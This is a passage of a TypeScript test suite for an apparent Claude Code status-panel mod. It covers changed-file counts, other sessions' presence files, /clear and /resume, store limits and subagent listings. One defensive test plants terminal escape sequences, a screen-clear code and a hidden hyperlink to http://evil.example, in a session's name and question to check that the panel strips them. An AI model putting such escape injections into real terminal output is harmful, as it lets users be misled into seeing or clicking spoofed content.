    expect(await changedCounts($)).toBe("+4 −1 · 1 file");
  });

  /** A repository `git init` made, with no commit yet. */
  async function unborn(h: Harness, $: Engine): Promise<void> {
    h.git.isUnborn = true;
    h.git.status = "# branch.oid (initial)\n# branch.head main\n";
    await briefed(h, $);
  }

  test("counts every line of a file Claude writes in a repository with no commit yet", async ($, on) => {
    const h = await boot($, on);
    await unborn(h, $);
    h.git.untracked[`${CWD}/index.html`] = 12;

    await startTurn($, "start the site");
    await $.tool.call({
      tool: "Write",
      file_path: `${CWD}/index.html`,
      content: "<p>hi</p>\n",
    });
    await h.clock.settle();

    expect(await changedCounts($)).toBe("+12 · 1 file");
  });

  test("counts every line of a file already added to a repository with no commit yet", async ($, on) => {
    const h = await boot($, on);
    await unborn(h, $);
    h.git.staged[`${CWD}/app.js`] = 30;

    await startTurn($, "edit the app");
    await $.tool.call(edit(`${CWD}/app.js`));
    await h.clock.settle();

    expect(await changedCounts($)).toBe("+30 · 1 file");
  });

  test("leaves a file .gitignore leaves out off the list in a repository with no commit yet", async ($, on) => {
    const h = await boot($, on);
    await unborn(h, $);
    h.git.ignored.push(`${CWD}/dist/app.js`);

    await startTurn($, "build it");
    await $.tool.call({
      tool: "Write",
      file_path: `${CWD}/dist/app.js`,
      content: "x\n",
    });
    await h.clock.settle();

    expect(section(await panelLines($), "CHANGED")).toEqual([]);
  });
});

describe("other sessions' presence files", () => {
  test("still lists the sessions that need you when another session's file is malformed", async ($, on) => {
    const h = await boot($, on);
    const now = h.clock.now();
    h.files[`${PRESENCE}/broken.json`] = JSON.stringify({
      sessionId: "broken",
      name: "No folder",
      state: "waiting",
      updatedAt: now,
    });
    h.files[`${PRESENCE}/odd.json`] = JSON.stringify({
      sessionId: "odd",
      name: "Odd one",
      state: "waiting",
      question: 42,
      since: now,
      cwd: "/home/dev/odd",
      zellijSession: null,
      tabPosition: null,
      updatedAt: now,
      isEnded: false,
    });
    otherSession(h, {
      id: "a",
      name: "Bookshelf plans",
      state: "waiting",
      question: "Order the shelves?",
    });
    await briefed(h, $);

    await h.clock.advance(POLL);
    const needsYou = section(await panelLines($), "NEEDS YOU");

    expect(needsYou[0]?.endsWith("1 of 2 sessions")).toBe(true);
    expect(needsYou.join("\n")).toContain("Bookshelf plans");
    expect(needsYou.join("\n")).not.toContain("Odd one");
  });

  test("shows another session's name and question without escape sequences", async ($, on) => {
    const h = await boot($, on);
    otherSession(h, {
      id: "a",
      name: "\u001b[2JBookshelf plans",
      state: "waiting",
      question:
        "Order \u001b]8;;http://evil.example\u0007the shelves\u001b]8;;\u0007?",
    });
    await briefed(h, $);

    await h.clock.advance(POLL);
    const needsYou = section(await panelLines($), "NEEDS YOU");

    expect(needsYou[1]).toMatch(/^◆ Bookshelf plans +tab 2 · 0m$/);
    expect(needsYou[2]).toBe("Order the shelves?");
  });

  test("removes the files of sessions that ended or left an hour ago, and keeps the rest", async ($, on) => {
    const h = await boot($, on);
    const now = h.clock.now();
    otherSession(h, { id: "live", name: "Live", state: "working" });
    otherSession(h, {
      id: "ended",
      name: "Ended",
      state: "done",
      isEnded: true,
    });
    otherSession(h, {
      id: "quiet",
      name: "Quiet",
      state: "done",
      updatedAt: now - 4 * MINUTE,
    });
    otherSession(h, {
      id: "gone",
      name: "Gone",
      state: "waiting",
      updatedAt: now - 2 * HOUR,
    });
    h.files[`${PRESENCE}/junk.json`] = "{not json";
    h.mtimes[`${PRESENCE}/junk.json`] = now - 2 * HOUR;
    h.files[`${PRESENCE}/half.json`] = '{"sessionId":';
    h.mtimes[`${PRESENCE}/half.json`] = now;
    await briefed(h, $);

    await h.clock.advance(POLL);
    const kept = Object.keys(h.files)
      .filter((path) => path.startsWith(`${PRESENCE}/`))
      .map((path) => path.slice(PRESENCE.length + 1))
      .sort();

    expect(kept).toEqual(
      ["half.json", "live.json", "quiet.json", `${SESSION}.json`].sort()
    );
  });
});

describe("a conversation that /clear or /resume replaced", () => {
  const RESUMED = {
    title: "Write the release notes",
    tab: "Release notes",
    story: "Drafted the notes for 0.5.",
    now: { state: "done", text: "notes drafted" },
    steps: [],
    plan: [],
    isPinned: false,
    updatedAt: START - 30 * MINUTE,
  };

  /** A conversation with a brief, a changed file and the context measured. */
  async function worked(h: Harness, $: Engine): Promise<void> {
    await briefed(h, $);
    h.git.changed[`${CWD}/app.rb`] = "12\t3";
    const turnId = await startTurn($, "edit it");
    await $.tool.call(edit(`${CWD}/app.rb`));
    await endTurn($, turnId, { answer: "Done." });
    await measure($, { tokens: 142_000, percent: 71 });
    await h.clock.settle();
  }

  test("shows none of the last conversation's brief, files or context after /clear", async ($, on) => {
    const h = await boot($, on);
    await worked(h, $);

    await switchConversation(h, $, "clear", "sess-2");
    const lines = await linesAfterSetUp(h, $);

    expect(lines.join("\n")).not.toContain("Fuse gauges with near-limit bars");
    expect(section(lines, "CHANGED")).toHaveLength(0);
    expect(section(lines, "CONTEXT")).toHaveLength(0);
  });

  test("starts the next brief from nothing, and keeps it under the new conversation", async ($, on) => {
    const h = await boot($, on);
    await worked(h, $);
    await switchConversation(h, $, "clear", "sess-2");

    nameSession(h, RESUMED.title);
    await runTurn($, { prompt: "write the release notes", answer: "Done." });
    await h.clock.settle();
    const lines = await linesAfterSetUp(h, $);

    expect(lines[0]).toBe(RESUMED.title);
    expect(lines.join("\n")).not.toContain(BRIEF.story);
    expect((h.store.get("brief:sess-2") as { title?: string })?.title).toBe(
      RESUMED.title
    );
    expect((h.store.get(`brief:${SESSION}`) as { title?: string })?.title).toBe(
      BRIEF.title
    );
  });

  test("drops a /brief refresh of the last conversation that lands after /clear", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    h.forkReplies.push({
      text: reply({ ...BRIEF, story: "A late story from before." }),
      afterMs: 5 * SECOND,
    });
    const refreshing = runCommand($, "brief", "refresh");

    await switchConversation(h, $, "clear", "sess-2");
    await h.clock.advance(6 * SECOND);
    await refreshing;
    const lines = await linesAfterSetUp(h, $);

    expect(h.store.has("brief:sess-2")).toBe(false);
    expect(lines.join("\n")).not.toContain("A late story from before.");
  });

  test("shows the resumed conversation's own brief after /resume", async ($, on) => {
    const h = await boot($, on, { "brief:sess-2": RESUMED });
    await worked(h, $);

    await switchConversation(h, $, "resume", "sess-2");
    const lines = await linesAfterSetUp(h, $);

    expect(lines[0]).toBe(RESUMED.title);
    expect(section(lines, "CHANGED")).toHaveLength(0);
  });

  test("keeps the brief when the mod loads again in the same conversation", async ($, on) => {
    const h = await boot($, on);
    await worked(h, $);

    await $.session.start({
      cwd: CWD,
      surface: "terminal",
      isInteractive: true,
    });
    const lines = await linesAfterSetUp(h, $);

    expect(lines[0]).toBe(BRIEF.title);
    expect(section(lines, "CHANGED")).not.toHaveLength(0);
  });
});

describe("the store", () => {
  test("keeps the last saved brief when saving a newer one fails", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    // Full: the newer, longer brief would take the store over its limit.
    h.storeLimit = storeSize(h.store);

    nameSession(h, "A newer title");
    await runTurn($, {
      prompt: "more",
      answer: `${BRIEF.story} ${"More detail on the gauges. ".repeat(8)}Done.`,
    });
    await h.clock.settle();

    expect((h.store.get(`brief:${SESSION}`) as { title?: string })?.title).toBe(
      BRIEF.title
    );
  });

  test("writes the changed files once a turn ends, and when the session quits mid-turn", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    const writes = () =>
      h.storeSets.filter((key) => key === `work:${SESSION}`).length;
    const saved = () =>
      (h.store.get(`work:${SESSION}`) as { files?: unknown[] })?.files ?? [];
    const before = writes();

    const turnId = await startTurn($, "edit five files");
    for (const name of ["a", "b", "c", "d", "e"])
      await $.tool.call(edit(`${CWD}/${name}.ts`));
    await endTurn($, turnId, { answer: "Done." });
    await h.clock.settle();

    expect(writes() - before).toBe(1);
    expect(saved()).toHaveLength(5);

    await startTurn($, "one more");
    await $.tool.call(edit(`${CWD}/f.ts`));
    await h.clock.settle();
    await endSession($);

    expect(saved()).toHaveLength(6);
  });
});

describe("the footer's path", () => {
  test("spells the home folder ~ only where one of its folders starts", async ($, on) => {
    const h = await boot($, on, {}, IN_ZELLIJ, "2.1.300", false);
    h.cwd = "/home/developer/proj";

    const lines = await linesAfterSetUp(h, $);

    expect(
      lines.some((line) => line.startsWith("/home/developer/proj:main"))
    ).toBe(true);
  });
});

describe("subagents", () => {
  test("lists each running subagent: what it does now, how long it has run and its tokens", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    const turnId = await startTurn($, "research it");
    const terminal = await spawnAgent($, "Terminal multi-session tools");
    const social = await spawnAgent($, "Social buzz and launch tactics");

    await $.tool.call({
      tool: "WebSearch",
      query: "claude-squad",
      agentId: terminal,
    } as never);
    await replyStep(
      h,
      $,
      turnId,
      { text: "", input: 170_000, output: 5_000, ms: 2 * SECOND },
      terminal
    );
    await $.tool.call({
      tool: "Read",
      file_path: `${CWD}/README.md`,
      agentId: social,
    } as never);
    await h.clock.advance(9 * MINUTE);
    const lines = await panelLines($, 60);
    const agents = section(lines, "AGENTS");

    expect(agents[0]).toMatch(/^AGENTS +2 running$/);
    expect(agents[1]).toMatch(/^◐ Terminal multi-session tools +9m · 175k$/);
    expect(agents[2]).toBe("  Searching the web for claude-squad");
    expect(agents[3]).toMatch(/^◐ Social buzz and launch tactics +9m$/);
    expect(agents[4]).toBe("  Reading README.md");
    expect(lines.indexOf("NOW")).toBeLessThan(lines.indexOf(agents[0] ?? ""));
  });

  test("drops a subagent once it finishes, and the section once none run", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    await startTurn($, "research it");
    const terminal = await spawnAgent($, "Terminal multi-session tools");
    const social = await spawnAgent($, "Social buzz and launch tactics");

    const agentRows = async () => {
      const panel = await mountPanel($, { bodyColumns: 60 });
      const lines = (await shown(panel)).split("\n");
      await panel.unmount();
      return section(lines, "AGENTS");
    };

    await endTurn($, "terminal-loop", {
      answer: "Found six.",
      agentId: terminal,
    });
    const agents = await agentRows();

    expect(agents[0]).toMatch(/^AGENTS +1 running$/);
    expect(agents.join("\n")).not.toContain("Terminal multi-session tools");

    await endTurn($, "social-loop", { answer: "Done.", agentId: social });
    expect(await agentRows()).toHaveLength(0);
  });

  test("rolls the subagents up before NOW as the dock shrinks", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    await startTurn($, "research it");
    for (const name of [
      "Terminal tools",
      "GUI orchestrators",
      "In-session HUDs",
      "Social buzz",
    ]) {
      const id = await spawnAgent($, name);
      await $.tool.call({
        tool: "WebSearch",
        query: name,
        agentId: id,
      } as never);
    }

    const rolledAt: Record<string, number> = {};
    for (let height = 40; height >= 8; height--) {
      const panel = await mountPanel($, {
        bodyColumns: 60,
        scroll: { offset: 0, bodyRows: height },
      });
      const lines = textOf(await panel.drawn()).split("\n");
      await panel.unmount();
      for (const [key, marker] of [
        ["agents", "▸ AGENTS"],
        ["now", "NOW  "],
      ] as const)
        if (lines.some((line) => line.startsWith(marker)))
          rolledAt[key] ??= height;
    }

    expect(rolledAt.agents).toBeDefined();
    expect(rolledAt.agents ?? 0).toBeGreaterThan(rolledAt.now ?? 0);
  });

  test("keeps a subagent that starts while the mod asks which still run, and drops one stopped with no turn", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    await startTurn($, "research it");
    const terminal = await spawnAgent($, "Terminal tools");
    const social = await spawnAgent($, "Social buzz");
    h.agents.statuses.set(social, "killed");
    h.agents.listDelayMs = 5 * SECOND;

    // On to the next look, which waits on Claude Code's answer.
    const lists = h.agents.lists;
    for (let i = 0; i < 10 && h.agents.lists === lists; i++)
      await h.clock.advance(SECOND);
    await spawnAgent($, "Forum threads");
    await $.tool.call({
      tool: "WebSearch",
      query: "issue trackers",
      agentId: terminal,
    } as never);
    h.agents.listDelayMs = 0;
    await h.clock.advance(5 * SECOND);
    const agents = section(await panelLines($, 60), "AGENTS");

    expect(h.agents.lists).toBeGreaterThan(lists);
    expect(agents[0]).toMatch(/^AGENTS +2 running$/);
    expect(agents.join("\n")).toContain("Forum threads");
    expect(agents.join("\n")).toContain("Searching the web for issue trackers");
    expect(agents.join("\n")).not.toContain("Social buzz");
  });
});
